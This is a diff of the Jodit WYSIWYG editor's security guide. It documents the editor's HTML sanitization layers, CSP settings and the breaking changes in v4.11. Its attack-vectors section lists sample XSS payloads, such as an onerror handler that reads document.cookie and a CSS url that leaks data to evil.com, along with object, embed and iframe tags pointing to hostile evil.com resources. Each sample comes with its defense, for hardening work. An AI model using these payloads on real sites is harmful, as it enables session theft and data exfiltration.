@@ -2,6 +2,8 @@
 
 Jodit Editor works with raw HTML, which means every piece of content entering or leaving the editor is a potential XSS vector. This guide covers Jodit's built-in defenses, how to configure them, and best practices for building secure applications.
 
+> See also: [clean-html plugin reference](https://xdsoft.net/jodit/docs/modules/plugins_clean_html.html) | [paste plugin reference](https://xdsoft.net/jodit/docs/modules/plugins_paste.html) | [iframe plugin reference](https://xdsoft.net/jodit/docs/modules/plugins_iframe.html)
+
 ## Table of Contents
 
 - [Architecture overview](#architecture-overview)
@@ -24,26 +26,35 @@ Jodit's security model consists of multiple layers:
 
 ```
 User input / paste / API (.value =)
-        │
-        ▼
-┌───────────────────────┐
-│  1. paste plugin      │  ← asks user how to insert, strips tags
-│  2. paste-from-word   │  ← cleans Word/Excel markup
-└───────────┬───────────┘
-            │
-            ▼
-┌───────────────────────┐
-│  3. clean-html plugin │  ← allowTags/denyTags, safeHTML, walker
-│     • safeHTML()      │  ← removes onerror, javascript: links
-│     • allowAttributes │  ← strips unknown attributes
-│     • tryRemoveNode   │  ← removes denied/unlisted tags
-│     • replaceOldTags  │  ← i→em, b→strong
-└───────────┬───────────┘
-            │
-            ▼
-┌───────────────────────┐
-│  4. iframe sandbox    │  ← optional: isolates editor DOM
-└───────────────────────┘
+        |
+        v
++---------------------------+
+|  0. sanitizer hook        |  <-- optional DOMPurify / external sanitizer
++-------------+-------------+
+              |
+              v
++--------------------------+
+|  1. paste plugin         |  <-- asks user how to insert, strips tags
+|  2. paste-from-word      |  <-- cleans Word/Excel markup
++-------------+------------+
+              |
+              v
++---------------------------------+
+|  3. clean-html plugin           |
+|   * safeHTML()                  |  <-- removes ALL on* handlers, javascript: links
+|   * allowAttributes             |  <-- strips unknown attributes
+|   * sanitizeStyles              |  <-- CSS property whitelist
+|   * tryRemoveNode               |  <-- removes denied/unlisted tags
+|   * safeLinksTarget             |  <-- auto rel="noopener noreferrer"
+|   * sandboxIframesInContent     |  <-- sandbox="" on <iframe>
+|   * convertUnsafeEmbeds         |  <-- <object>/<embed> -> sandboxed <iframe>
+|   * replaceOldTags              |  <-- i->em, b->strong
++---------------------------------+
+              |
+              v
++--------------------------+
+|  4. iframe sandbox       |  <-- optional: isolates editor DOM
++--------------------------+
 ```
 
 **Key principle:** Jodit's client-side sanitization is a defense-in-depth measure. It should never be your only line of defense. Always sanitize on the server before storing or rendering user content.
@@ -52,30 +63,37 @@ User input / paste / API (.value =)
 
 ## Plugin: clean-html
 
-The `clean-html` plugin (`src/plugins/clean-html/`) is the core sanitization engine. It runs continuously on every change, paste, mode switch, and programmatic value assignment.
+The [clean-html plugin](https://xdsoft.net/jodit/docs/modules/plugins_clean_html.html) (`src/plugins/clean-html/`) is the core sanitization engine. It runs continuously on every change, paste, mode switch, and programmatic value assignment.
 
 ### How it works
 
 1. **LazyWalker** traverses every DOM node in the editor with a configurable `timeout` (default 300ms).
 2. Each node passes through a chain of **filters** in `helpers/visitor/filters/`:
-   - `tryRemoveNode` — removes nodes based on `allowTags`/`denyTags`
-   - `allowAttributes` — strips attributes not in the whitelist
-   - `sanitizeAttributes` — removes `onerror`, neutralizes `javascript:` links
-   - `replaceOldTags` — normalizes `<i>` → `<em>`, `<b>` → `<strong>`
-   - `fillEmptyParagraph` — removes empty `<p>` tags
-   - `removeEmptyTextNode` — removes empty text nodes
-   - `removeInvTextNodes` — removes invisible text nodes
+   - `tryRemoveNode` -- removes nodes based on `allowTags`/`denyTags`
+   - `allowAttributes` -- strips attributes not in the whitelist
+   - `sanitizeAttributes` -- removes all `on*` event handlers, neutralizes `javascript:` links
+   - `sanitizeStyles` -- filters CSS properties by whitelist
+   - `safeLinksTarget` -- adds `rel="noopener noreferrer"` to `target="_blank"` links
+   - `sandboxIframesInContent` -- adds `sandbox=""` to `<iframe>` elements
+   - `convertUnsafeEmbeds` -- converts `<object>`/`<embed>` to sandboxed `<iframe>`
+   - `replaceOldTags` -- normalizes `<i>` to `<em>`, `<b>` to `<strong>`
+   - `fillEmptyParagraph` -- removes empty `<p>` tags
+   - `removeEmptyTextNode` -- removes empty text nodes
+   - `removeInvTextNodes` -- removes invisible text nodes
 3. On programmatic value assignment (`editor.value = ...`), `safeHTML()` runs **synchronously** before the value is set.
 
 ### Default protections (enabled out of the box)
 
 | Protection | Config key | Default | What it does |
 |---|---|---|---|
-| Block `<script>` | `denyTags` | `'script'` | Removes all `<script>` elements |
-| Remove `onerror` | `removeOnError` | `true` | Strips `onerror` attribute from all elements |
+| Block dangerous tags | `denyTags` | `'script,iframe,object,embed'` | Removes `<script>`, `<iframe>`, `<object>`, `<embed>` |
+| Remove ALL event handlers | `removeEventAttributes` | `true` | Strips all `on*` attributes (onclick, onerror, onload, etc.) |
 | Neutralize `javascript:` | `safeJavaScriptLink` | `true` | Prefixes `javascript:` hrefs with the current protocol |
+| Safe link targets | `safeLinksTarget` | `true` | Adds `rel="noopener noreferrer"` to `target="_blank"` links |
+| Sandbox iframes | `sandboxIframesInContent` | `true` | Adds `sandbox=""` to `<iframe>` elements in content |
+| Convert unsafe embeds | `convertUnsafeEmbeds` | `['object', 'embed']` | Converts listed tags to sandboxed `<iframe>` (`false` to disable) |
 
-### allowTags — whitelist mode
+### allowTags -- whitelist mode
 
 When `allowTags` is set, **only listed tags survive**. Everything else is removed. This is the strongest client-side protection.
 
@@ -122,7 +140,7 @@ allowTags: {
 }
 ```
 
-### denyTags — blacklist mode
+### denyTags -- blacklist mode
 
 When `allowTags` is `false` (default), `denyTags` is used instead. It removes only the listed tags.
 
@@ -136,7 +154,38 @@ Jodit.make('#editor', {
 
 > **Priority:** `allowTags` always overrides `denyTags`. If both are set, `denyTags` is ignored.
 
-### useIframeSandbox — extra parsing safety
+### allowedStyles -- CSS property whitelist
+
+Inline `style` attributes can be used for CSS injection attacks (e.g., data exfiltration via `background-image: url(...)`). The `allowedStyles` option lets you whitelist safe CSS properties:
+
+```javascript
+Jodit.make('#editor', {
+    cleanHTML: {
+        allowedStyles: {
+            '*': ['color', 'background-color', 'font-size', 'text-align', 'font-weight'],
+            img: ['width', 'height']
+        }
+    }
+});
+```
+
+When set, any CSS property not in the whitelist is stripped. Supports global (`*`) and tag-specific rules.
+
+### sanitizer -- external sanitizer hook
+
+Integrate DOMPurify or any other sanitizer. The hook is called **before** Jodit's built-in sanitization on every `editor.value = ...` assignment:
+
+```javascript
+import DOMPurify from 'dompurify';
+
+Jodit.make('#editor', {
+    cleanHTML: {
+        sanitizer: (html) => DOMPurify.sanitize(html)
+    }
+});
+```
+
+### useIframeSandbox -- extra parsing safety
 
 When enabled, Jodit parses incoming HTML inside a sandboxed `<iframe sandbox="allow-same-origin">` before inserting it. This prevents scripts and event handlers from executing during the parsing step.
 
@@ -162,13 +211,13 @@ Jodit.make('#editor', {
 });
 ```
 
-Available filter names: `tryRemoveNode`, `allowAttributes`, `sanitizeAttributes`, `replaceOldTags`, `fillEmptyParagraph`, `removeEmptyTextNode`, `removeInvTextNodes`.
+Available filter names: `tryRemoveNode`, `allowAttributes`, `sanitizeAttributes`, `sanitizeStyles`, `replaceOldTags`, `fillEmptyParagraph`, `removeEmptyTextNode`, `removeInvTextNodes`, `safeLinksTarget`, `sandboxIframesInContent`, `convertUnsafeEmbeds`.
 
 ---
 
 ## Plugin: paste
 
-The `paste` plugin (`src/plugins/paste/`) intercepts clipboard and drag-and-drop events.
+The [paste plugin](https://xdsoft.net/jodit/docs/modules/plugins_paste.html) (`src/plugins/paste/`) intercepts clipboard and drag-and-drop events.
 
 ### Paste modes
 
@@ -217,7 +266,7 @@ Jodit.make('#editor', {
 
 ## Plugin: paste-from-word
 
-The `paste-from-word` plugin (`src/plugins/paste-from-word/`) detects content from Microsoft Word/Excel and offers special cleaning.
+The [paste-from-word plugin](https://xdsoft.net/jodit/docs/modules/plugins_paste_from_word.html) (`src/plugins/paste-from-word/`) detects content from Microsoft Word/Excel and offers special cleaning.
 
 Word documents embed massive amounts of XML namespaces, proprietary styles, and metadata. The `cleanFromWord()` helper:
 
@@ -251,7 +300,7 @@ Jodit.make('#editor', {
 
 ## Plugin: iframe
 
-The `iframe` plugin (`src/plugins/iframe/`) renders the editing area inside an `<iframe>`, isolating the editor's DOM from the host page.
+The [iframe plugin](https://xdsoft.net/jodit/docs/modules/plugins_iframe.html) (`src/plugins/iframe/`) renders the editing area inside an `<iframe>`, isolating the editor's DOM from the host page.
 
 ### Basic iframe mode
 
@@ -295,25 +344,77 @@ Jodit.make('#editor', {
 |---|---|---|
 | Inline styles on elements | `style-src 'unsafe-inline'` | Jodit sets inline styles for formatting (font color, size, alignment, etc.) |
 | `<style>` tags in iframe mode | `style-src 'unsafe-inline'` | The iframe plugin injects a `<style>` element |
-| `document.write` in iframe mode | — | Used to build the iframe document structure |
-| `innerHTML` assignments | — | Used internally for DOM manipulation |
-| No `eval()` or `Function()` | — | Jodit does NOT use `eval()` — `script-src 'unsafe-eval'` is not required |
-| No inline `<script>` | — | Jodit does NOT inject inline scripts |
+| `document.write` in iframe mode | -- | Used to build the iframe document structure |
+| `innerHTML` assignments | -- | Used internally for DOM manipulation |
+| No `eval()` or `Function()` | -- | Jodit does NOT use `eval()` -- `script-src 'unsafe-eval'` is not required |
+| No inline `<script>` | -- | Jodit does NOT inject inline scripts |
 | External resources (CDN) | `script-src`, `style-src` | When loading from CDN |
 | Image upload (base64) | `img-src data:` | When using `insertImageAsBase64URI: true` |
 | Image upload (server) | `img-src https://your-api.com` | For server-hosted images |
 
 ### Minimal CSP for Jodit
 
+Some Jodit plugins dynamically load external libraries from CDN. By default:
+
+- **Source editor** (`sourceEditor: 'ace'`) loads [Ace](https://ace.c9.io/) from `cdnjs.cloudflare.com` (configurable via `sourceEditorCDNUrlsJS`)
+- **HTML beautifier** (`beautifyHTML: true`) loads [js-beautify](https://github.com/beautifier/js-beautify) from `cdnjs.cloudflare.com` (configurable via `beautifyHTMLCDNUrlsJS`)
+- **Paste Code** (Pro, [`pasteCode`](https://xdsoft.net/jodit/pro/docs/plugin/paste-code/) plugin) loads [Prism.js](https://prismjs.com/) from `cdnjs.cloudflare.com` — both JS and CSS (configurable via `pasteCode.highlightLib`)
+
+If you use these defaults, you need to whitelist the CDN origin:
+
 ```http
 Content-Security-Policy:
     default-src 'self';
-    script-src 'self' https://cdn.jsdelivr.net;
-    style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
+    script-src 'self' https://cdnjs.cloudflare.com;
+    style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;
     img-src 'self' data: https:;
-    font-src 'self' https://cdn.jsdelivr.net;
+    font-src 'self';
     frame-src 'self';
     connect-src 'self' https://your-api.com;
+```
+
+### Self-hosted external libraries (tighter CSP)
+
+To avoid whitelisting external CDNs, host the libraries yourself and override the URLs:
+
+```javascript
+Jodit.make('#editor', {
+    sourceEditorCDNUrlsJS: ['/vendor/ace/ace.js'],
+    beautifyHTMLCDNUrlsJS: [
+        '/vendor/js-beautify/beautify.min.js',
+        '/vendor/js-beautify/beautify-html.min.js'
+    ],
+    // Pro only: pasteCode plugin
+    pasteCode: {
+        highlightLib: {
+            js: ['/vendor/prism/prism.min.js'],
+            css: ['/vendor/prism/prism.min.css']
+        }
+    }
+});
+```
+
+Then your CSP needs only `'self'`:
+
+```http
+Content-Security-Policy:
+    default-src 'self';
+    script-src 'self';
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' data: https:;
+    font-src 'self';
+    frame-src 'self';
+    connect-src 'self' https://your-api.com;
+```
+
+Alternatively, disable these features entirely if you don't need them:
+
+```javascript
+Jodit.make('#editor', {
+    sourceEditor: 'area',  // plain textarea instead of Ace
+    beautifyHTML: false,
+    disablePlugins: ['pasteCode']  // Pro only
+});
 ```
 
 ### CSP with nonce (when possible)
@@ -328,6 +429,7 @@ Jodit currently does not support nonce-based `<style>` injection. If your applic
 - `'unsafe-eval'` is **NOT** required — Jodit never uses `eval()` or `new Function()`
 - `'unsafe-inline'` in `script-src` is **NOT** required — Jodit never creates inline script elements
 - `'unsafe-inline'` in `style-src` **IS** required — Jodit uses inline styles for text formatting (this is inherent to WYSIWYG editing)
+- Replace `https://your-api.com` in `connect-src` with your actual upload/API endpoint
 
 ---
 
@@ -357,6 +459,22 @@ if (window.trustedTypes) {
     const safeHTML = joditPolicy.createHTML(untrustedContent);
     editor.value = safeHTML.toString();
 }
+```
+
+### Using the sanitizer hook with Trusted Types
+
+The simplest approach is to use the built-in `sanitizer` hook:
+
+```javascript
+import DOMPurify from 'dompurify';
+
+Jodit.make('#editor', {
+    cleanHTML: {
+        sanitizer: (html) => DOMPurify.sanitize(html, {
+            RETURN_TRUSTED_TYPE: false
+        })
+    }
+});
 ```
 
 ### Wrapping Jodit with Trusted Types
@@ -461,30 +579,22 @@ if (typeof Sanitizer !== 'undefined') {
 }
 ```
 
-### Combining Jodit's built-in sanitization with the Sanitizer API
+### Using the sanitizer hook with the Sanitizer API
 
 ```javascript
 const editor = Jodit.make('#editor', {
     cleanHTML: {
-        // Jodit's own protection layer
-        denyTags: 'script,iframe,object,embed',
-        removeOnError: true,
-        safeJavaScriptLink: true
+        sanitizer: typeof Sanitizer !== 'undefined'
+            ? (html) => {
+                const div = document.createElement('div');
+                div.setHTML(html, { sanitizer: new Sanitizer({
+                    blockElements: ['script', 'iframe', 'object', 'embed']
+                }) });
+                return div.innerHTML;
+            }
+            : false
     }
 });
-
-// Add Sanitizer API as a second layer
-if (typeof Sanitizer !== 'undefined') {
-    const sanitizer = new Sanitizer({
-        blockElements: ['script', 'iframe', 'object', 'embed']
-    });
-
-    editor.events.on('safeHTML', (sandBox) => {
-        const clean = document.createElement('div');
-        clean.setHTML(sandBox.innerHTML, { sanitizer });
-        sandBox.innerHTML = clean.innerHTML;
-    });
-}
 ```
 
 ---
@@ -528,9 +638,7 @@ function sanitizeEditorContent(html) {
         ],
         ALLOW_DATA_ATTR: false,
         ADD_ATTR: ['target'],
-        // Force all links to have rel="noopener noreferrer"
         FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
-        // Strip javascript: URIs
         ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i
     });
 }
@@ -590,10 +698,10 @@ A production-ready configuration combining all security layers:
 
 ```javascript
 const editor = Jodit.make('#editor', {
-    // ── Clean HTML: core sanitization ──
+    // -- Clean HTML: core sanitization --
     cleanHTML: {
         // Whitelist approach: only allow safe tags
-        allowTags: {
+        allowTags: Jodit.atom({
             p: true,
             br: true,
             strong: true,
@@ -625,80 +733,60 @@ const editor = Jodit.make('#editor', {
             div: true,
             sub: true,
             sup: true
+        }),
+
+        // CSS property whitelist (prevents CSS injection)
+        allowedStyles: {
+            '*': ['color', 'background-color', 'font-size', 'text-align',
+                  'font-weight', 'text-decoration', 'font-family', 'vertical-align'],
+            img: ['width', 'height'],
+            td: ['width', 'height'],
+            th: ['width', 'height']
         },
 
-        // XSS protections (enabled by default, listed explicitly for clarity)
-        removeOnError: true,
+        // XSS protections (all enabled by default, listed for clarity)
+        removeEventAttributes: true,
         safeJavaScriptLink: true,
+        safeLinksTarget: true,
+        sandboxIframesInContent: true,
+        convertUnsafeEmbeds: Jodit.atom(['object', 'embed']),
 
         // Use sandbox for parsing (slightly slower, more secure)
         useIframeSandbox: true,
 
+        // Optional: integrate DOMPurify for maximum protection
+        // sanitizer: (html) => DOMPurify.sanitize(html),
+
         // Tag normalization
-        replaceOldTags: {
+        replaceOldTags: Jodit.atom({
             i: 'em',
             b: 'strong'
-        }
+        })
     },
 
-    // ── Paste: clipboard protection ──
+    // -- Paste: clipboard protection --
     askBeforePasteHTML: true,
     processPasteHTML: true,
     defaultActionOnPaste: 'insert_as_html',
-    pasteExcludeStripTags: ['br', 'hr'],
+    pasteExcludeStripTags: Jodit.atom(['br', 'hr']),
 
-    // ── Paste from Word ──
+    // -- Paste from Word --
     askBeforePasteFromWord: true,
     processPasteFromWord: true,
     defaultActionOnPasteFromWord: 'insert_as_text',
 
-    // ── Upload: prevent arbitrary file uploads ──
+    // -- Upload: prevent arbitrary file uploads --
     uploader: {
         insertImageAsBase64URI: false,     // Use server upload instead
         url: '/api/upload',                 // Your upload endpoint
         filesVariableName: 'files',
-        imagesExtensions: ['jpg', 'jpeg', 'png', 'gif', 'svg', 'webp']
+        imagesExtensions: Jodit.atom(['jpg', 'jpeg', 'png', 'gif', 'svg', 'webp'])
     },
 
-    // ── Iframe mode (optional additional isolation) ──
+    // -- Iframe mode (optional additional isolation) --
     // iframe: true,
     // iframeSandbox: 'allow-same-origin allow-scripts',
 });
-
-// ── Custom event: additional sanitization hook ──
-editor.events.on('safeHTML', (sandBox) => {
-    // Remove ALL event handler attributes (not just onerror)
-    sandBox.querySelectorAll('*').forEach(el => {
-        [...el.attributes].forEach(attr => {
-            if (attr.name.startsWith('on')) {
-                el.removeAttribute(attr.name);
-            }
-        });
-
-        // Remove javascript: from any attribute, not just href
-        ['href', 'src', 'action', 'formaction', 'xlink:href'].forEach(attrName => {
-            const val = el.getAttribute(attrName);
-            if (val && val.trim().toLowerCase().startsWith('javascript:')) {
-                el.removeAttribute(attrName);
-            }
-        });
-    });
-});
-
-// ── Before saving: final validation ──
-function getCleanValue() {
-    let html = editor.value;
-
-    // Additional client-side sanitization before sending to server
-    // (defense-in-depth, server must also sanitize)
-    if (typeof Sanitizer !== 'undefined') {
-        const div = document.createElement('div');
-        div.setHTML(html, { sanitizer: new Sanitizer() });
-        html = div.innerHTML;
-    }
-
-    return html;
-}
 ```
 
 ---
@@ -707,21 +795,23 @@ function getCleanValue() {
 
 ### Client-Side (Jodit Configuration)
 
-- [ ] Set `cleanHTML.denyTags` to block dangerous tags (`script`, `iframe`, `object`, `embed`, `form`)
-- [ ] Or use `cleanHTML.allowTags` with a whitelist (stronger)
-- [ ] Keep `cleanHTML.removeOnError: true` (default)
+- [ ] Keep `cleanHTML.denyTags` at default (`'script,iframe,object,embed'`) or use `allowTags` whitelist
+- [ ] Keep `cleanHTML.removeEventAttributes: true` (default) -- removes all `on*` handlers
 - [ ] Keep `cleanHTML.safeJavaScriptLink: true` (default)
+- [ ] Keep `cleanHTML.safeLinksTarget: true` (default) -- auto `rel="noopener noreferrer"`
+- [ ] Keep `cleanHTML.sandboxIframesInContent: true` (default)
+- [ ] Keep `cleanHTML.convertUnsafeEmbeds` at default `['object', 'embed']`
+- [ ] Consider `cleanHTML.allowedStyles` to whitelist CSS properties
+- [ ] Consider `cleanHTML.sanitizer` to integrate DOMPurify
 - [ ] Enable `cleanHTML.useIframeSandbox: true` for high-security contexts
 - [ ] Configure `askBeforePasteHTML: true` to let users control paste behavior
 - [ ] Set `defaultActionOnPasteFromWord: 'insert_as_text'` to clean Word content
-- [ ] Add a `safeHTML` event handler to strip all `on*` event attributes
-- [ ] If using iframe mode, set appropriate `iframeSandbox` restrictions
 
 ### Server-Side (Your Backend)
 
 - [ ] **Always sanitize HTML on the server** before storing or rendering
 - [ ] Use a proven library (DOMPurify, HTML Purifier, bleach, etc.)
-- [ ] Whitelist allowed tags and attributes — don't rely on blacklists
+- [ ] Whitelist allowed tags and attributes -- don't rely on blacklists
 - [ ] Validate and whitelist URL schemes in `href`/`src` (`http:`, `https:`, `mailto:`)
 - [ ] Strip or validate `style` attributes (CSS injection can leak data)
 - [ ] Set `rel="noopener noreferrer"` on all user-generated links with `target="_blank"`
@@ -759,9 +849,11 @@ function getCleanValue() {
 ```html
 <!-- Attack -->
 <img src="x" onerror="alert(document.cookie)">
+<div onclick="alert(1)">click me</div>
+<svg onload="alert(1)">
+<input onfocus="alert(1)" autofocus>
 
-<!-- Defense: removeOnError strips onerror (default) -->
-<!-- Extra: safeHTML event handler strips ALL on* attributes -->
+<!-- Defense: removeEventAttributes (default: true) strips ALL on* attributes -->
 ```
 
 ### 3. `javascript:` URIs
@@ -773,32 +865,100 @@ function getCleanValue() {
 <!-- Defense: safeJavaScriptLink neutralizes javascript: URIs (default) -->
 ```
 
-### 4. CSS injection (data exfiltration)
+### 4. `window.opener` attack
 
 ```html
 <!-- Attack -->
-<style>
-input[value^="secret"] { background: url('https://evil.com/leak?v=secret'); }
-</style>
+<a href="https://evil.com" target="_blank">Click</a>
+<!-- evil.com can access window.opener and redirect the original page -->
 
-<!-- Defense: denyTags should include 'style' for user content -->
-<!-- Server-side: validate/strip style attributes -->
+<!-- Defense: safeLinksTarget (default: true) adds rel="noopener noreferrer" -->
 ```
 
-### 5. SVG-based XSS
+### 5. CSS injection (data exfiltration)
+
+```html
+<!-- Attack -->
+<p style="background-image: url('https://evil.com/leak?data=secret')">text</p>
+
+<!-- Defense: allowedStyles whitelist blocks unauthorized CSS properties -->
+```
+
+### 6. Unsafe embeds
+
+```html
+<!-- Attack -->
+<object data="https://evil.com/malware.swf" type="application/x-shockwave-flash"></object>
+<embed src="https://evil.com/exploit.swf">
+
+<!-- Defense: convertUnsafeEmbeds (default: true) converts to sandboxed iframe -->
+<!-- Defense: denyTags (default) blocks object and embed -->
+```
+
+### 7. Unsandboxed iframes
+
+```html
+<!-- Attack -->
+<iframe src="https://evil.com/phishing"></iframe>
+<!-- Can run scripts, access parent page, show phishing content -->
+
+<!-- Defense: sandboxIframesInContent (default: true) adds sandbox="" -->
+<!-- Defense: denyTags (default) blocks iframe entirely -->
+```
+
+### 8. SVG-based XSS
 
 ```html
 <!-- Attack -->
 <svg onload="alert(1)"><circle r="50"/></svg>
 
+<!-- Defense: removeEventAttributes strips onload -->
 <!-- Defense: allowTags whitelist (don't include svg unless needed) -->
-<!-- If SVG needed: strip event handlers via safeHTML event -->
 ```
 
-### 6. Mutation XSS (mXSS)
+### 9. Mutation XSS (mXSS)
 
 Some HTML, when parsed and re-serialized, produces different (malicious) DOM. Jodit mitigates this with:
-- `useIframeSandbox: true` — parses in an isolated context
+- `useIframeSandbox: true` -- parses in an isolated context
 - The continuous `LazyWalker` re-checks DOM after mutations
+- `sanitizer` hook -- use DOMPurify which specifically handles mXSS vectors
 
-For maximum protection against mXSS, use DOMPurify on the server — it specifically handles mXSS vectors.
+For maximum protection against mXSS, use DOMPurify on the server.
+
+---
+
+## Migration from v4.10.x
+
+### Breaking changes in v4.11.0
+
+1. **`denyTags` default changed** from `'script'` to `'script,iframe,object,embed'`
+
+   If you need iframes in your content:
+   ```javascript
+   cleanHTML: { denyTags: 'script' }
+   ```
+
+2. **`removeEventAttributes` replaces `removeOnError`**
+
+   Now removes ALL `on*` event handlers, not just `onerror`. The `removeOnError` option still works but is deprecated.
+
+3. **`safeLinksTarget` is now `true` by default**
+
+   All `target="_blank"` links get `rel="noopener noreferrer"`. To disable:
+   ```javascript
+   cleanHTML: { safeLinksTarget: false }
+   ```
+
+4. **`sandboxIframesInContent` is now `true` by default**
+
+   All `<iframe>` in content get `sandbox=""`. To disable:
+   ```javascript
+   cleanHTML: { sandboxIframesInContent: false }
+   ```
+
+5. **`convertUnsafeEmbeds` is now `['object', 'embed']` by default**
+
+   `<object>` and `<embed>` are converted to sandboxed `<iframe>`. To disable:
+   ```javascript
+   cleanHTML: { convertUnsafeEmbeds: false }
+   ```
